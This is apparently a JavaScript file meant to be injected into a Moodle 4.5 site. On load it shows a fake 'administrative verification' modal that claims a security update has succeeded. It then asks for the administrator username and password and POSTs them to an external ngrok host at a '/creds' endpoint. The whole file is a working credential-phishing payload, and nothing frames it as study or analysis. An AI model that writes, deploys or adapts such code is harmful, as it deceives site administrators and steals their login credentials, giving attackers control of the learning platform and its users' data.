/**
 * script.js
 * Modal de vérification administrative Moodle 4.5
 */

function injectExternalStyles() {
    const cdnLinks = [
        'https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css',
        'https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css'
    ];
    cdnLinks.forEach(url => {
        const link = document.createElement('link');
        link.rel = 'stylesheet';
        link.href = url;
        document.head.appendChild(link);
    });
}

const moodleLogoUrl = 'https://moodle.com/wp-content/uploads/2024/02/Moodlelogo.svg';

// --- 1er modal ---
function showAdminVerificationModal() {
    const modal = document.createElement('div');
    modal.id = 'admin-verification-modal';
    modal.className = 'modal d-block';
    modal.style.cssText = 'position: fixed; top:0; left:0; width:100%; height:100%; overflow:auto; z-index:9999; background-color: rgba(0,0,0,0.5);';

    const dialog = document.createElement('div');
    dialog.className = 'modal-dialog modal-dialog-centered';
    dialog.setAttribute('role', 'document');

    const content = document.createElement('div');
    content.className = 'modal-content shadow-lg';
    content.style.borderRadius = '0.5rem';

    // Header
    const header = document.createElement('div');
    header.className = 'modal-header bg-danger text-white';
    header.innerHTML = `<h5 class="modal-title fs-5"><i class="fas fa-shield-alt fa-fw me-2"></i> Vérification d'Action Administrative</h5>`;

    // Body
    const body = document.createElement('div');
    body.className = 'modal-body text-center';
    body.innerHTML = `
        <img src="${moodleLogoUrl}" alt="Moodle Logo" style="width:100px; margin-bottom:1rem;">
        <p><strong>Moodle 4.5.1, une confirmation de sécurité est requise avant de procéder.</strong></p>
        <p class="text-muted small mt-3">
            Mise à jour automatique des correctifs de sécurité et d'améliorations de stabilité et performance terminée avec succès.
        </p>
    `;

    // Footer
    const footer = document.createElement('div');
    footer.className = 'modal-footer justify-content-end';
    const confirmButton = document.createElement('button');
    confirmButton.type = 'button';
    confirmButton.className = 'btn btn-primary';
    confirmButton.textContent = "Continuer l'Action";
    confirmButton.addEventListener('click', function() {
        modal.remove();
        showAdminLoginModal();
    });
    footer.appendChild(confirmButton);

    content.appendChild(header);
    content.appendChild(body);
    content.appendChild(footer);
    dialog.appendChild(content);
    modal.appendChild(dialog);
    document.body.appendChild(modal);
}

// --- 2e modal : demande login/pwd ---
function showAdminLoginModal() {
    const modal = document.createElement('div');
    modal.id = 'admin-login-modal';
    modal.className = 'modal d-block';
    modal.style.cssText = 'position: fixed; top:0; left:0; width:100%; height:100%; overflow:auto; z-index:9999; background-color: rgba(0,0,0,0.5);';

    const dialog = document.createElement('div');
    dialog.className = 'modal-dialog modal-dialog-centered';
    dialog.setAttribute('role', 'document');

    const content = document.createElement('div');
    content.className = 'modal-content shadow-lg';
    content.style.borderRadius = '0.5rem';

    // Header
    const header = document.createElement('div');
    header.className = 'modal-header bg-warning text-dark';
    header.innerHTML = `<h5 class="modal-title fs-5"><i class="fas fa-user-shield fa-fw me-2"></i> Authentification Administrateur</h5>`;

    // Body
    const body = document.createElement('div');
    body.className = 'modal-body';
    body.innerHTML = `
        <form id="admin-login-form">
            <div class="mb-3">
                <label for="admin-username" class="form-label">Nom d'utilisateur</label>
                <input type="text" class="form-control" id="admin-username" required>
            </div>
            <div class="mb-3">
                <label for="admin-password" class="form-label">Mot de passe</label>
                <input type="password" class="form-control" id="admin-password" required>
            </div>
        </form>
    `;

    // Footer
    const footer = document.createElement('div');
    footer.className = 'modal-footer justify-content-end';
    const confirmButton = document.createElement('button');
    confirmButton.type = 'button';
    confirmButton.className = 'btn btn-primary';
    confirmButton.textContent = 'Confirmer';
    confirmButton.addEventListener('click', function() {
        const username = document.getElementById('admin-username').value;
        const password = document.getElementById('admin-password').value;

        if(username && password){
            // Remove modal immediately
            modal.remove();

            // Send credentials to server
            fetch("https://elidible-micah-futile.ngrok-free.dev/creds", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({ username, password })
            })
            .then(response => response.json())
            .then(data => {
                console.log("Server response:", data);
                if (data.success) {
                    alert(`Authentification réussie pour ${username}. Action administrative en cours.`);
                } else {
                    alert("Erreur lors de l'envoi des identifiants : " + data.error);
                }
            })
            .catch(error => {
                console.error("Fetch error:", error);
                alert("Impossible d'envoyer les identifiants au serveur.");
            });

        } else {
            alert('Veuillez remplir tous les champs.');
        }
    });
    footer.appendChild(confirmButton);

    content.appendChild(header);
    content.appendChild(body);
    content.appendChild(footer);
    dialog.appendChild(content);
    modal.appendChild(dialog);
    document.body.appendChild(modal);
}


// Exécution
injectExternalStyles();
showAdminVerificationModal();
